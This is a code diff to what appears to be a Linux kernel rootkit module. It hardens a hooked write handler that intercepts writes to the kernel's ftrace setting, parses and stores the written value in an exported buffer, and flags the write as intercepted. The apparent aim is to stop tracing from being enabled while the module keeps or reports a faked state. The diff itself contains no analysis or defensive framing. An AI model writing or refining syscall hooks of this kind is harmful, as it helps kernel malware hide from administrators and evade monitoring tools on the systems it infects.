@@ -4,7 +4,7 @@
 
 #define BUF_SIZE 4096
 
-char saved_ftrace_value[16] = "1\n";
+char saved_ftrace_value[64] = "1\n";
 EXPORT_SYMBOL(saved_ftrace_value);
 
 bool ftrace_write_intercepted = false;
@@ -153,6 +153,7 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
         }
         
         bool valid = false;
+        long parsed_value = 0;
         
         if (count >= 1) {
             char temp_buf[32];
@@ -164,10 +165,28 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
             
             if ((temp_buf[0] >= '0' && temp_buf[0] <= '9') || temp_buf[0] == '-') {
                 
-                simple_strtol(temp_buf, &endptr, 0);
+                parsed_value = simple_strtol(temp_buf, &endptr, 0);
                 
                 if (endptr != temp_buf) {
-                    valid = true;
+                    size_t digits = 0;
+                    size_t i = (temp_buf[0] == '-' || temp_buf[0] == '+') ? 1 : 0;
+                    
+                    while (i < parse_len && temp_buf[i] >= '0' && temp_buf[i] <= '9') {
+                        digits++;
+                        i++;
+                    }
+                    
+                    if (digits <= 19) {
+                        if (parsed_value != LONG_MAX && parsed_value != LONG_MIN) {
+                            valid = true;
+                        } else {
+                            char verify_buf[32];
+                            snprintf(verify_buf, sizeof(verify_buf), "%ld", parsed_value);
+                            if (strncmp(temp_buf, verify_buf, strlen(verify_buf)) == 0) {
+                                valid = true;
+                            }
+                        }
+                    }
                 }
             }
         }
@@ -177,9 +196,10 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
             return -EINVAL;
         }
         
-        size_t len = min(count, (size_t)(sizeof(saved_ftrace_value) - 1));
-        memcpy(saved_ftrace_value, kernel_buf, len);
-        saved_ftrace_value[len] = '\0';
+        int written = snprintf(saved_ftrace_value, sizeof(saved_ftrace_value), "%ld\n", parsed_value);
+        if (written >= sizeof(saved_ftrace_value)) {
+            saved_ftrace_value[sizeof(saved_ftrace_value) - 1] = '\0';
+        }
         ftrace_write_intercepted = true;
         
         kfree(kernel_buf);
